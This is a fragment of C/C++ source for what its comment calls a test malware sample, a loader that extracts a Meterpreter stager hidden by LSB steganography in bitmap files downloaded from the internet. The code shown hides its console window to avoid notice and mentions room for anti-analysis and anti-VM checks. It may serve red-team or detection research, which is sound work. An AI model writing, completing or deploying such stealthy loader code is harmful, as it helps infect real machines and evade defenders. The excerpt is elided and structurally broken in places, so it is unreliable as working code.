/*
	...
	This is a test malware sample used to load LSB encoded code from
	the internet. This specific sample template works with LSB encoded
	bitmap files to extract a stager payload for meterpreter.
...
extern "C" int __cdecl __purecall(void)
{
	...
	int main(void)
#else
	int __stdcall entrymain(void)
#endif
{
	// Initialize our API
	API * api = new API();

	//If we can't hide the console, our cover is blown - exit now!
	HWND hConsole = api->GetConsoleWindow();

	// If our console is NULL, we don't have a console to hide (we are okay!)
	if (hConsole != NULL && api->ShowWindow(hConsole, SW_HIDE) != FALSE)
	{
		//quit the program since we can't hide our actions
		return -1;
	}

	// Dive into our malware main if we are satisfied (could run other
	// anti-analysis or anti-vm check before execution(api) if we wanted)
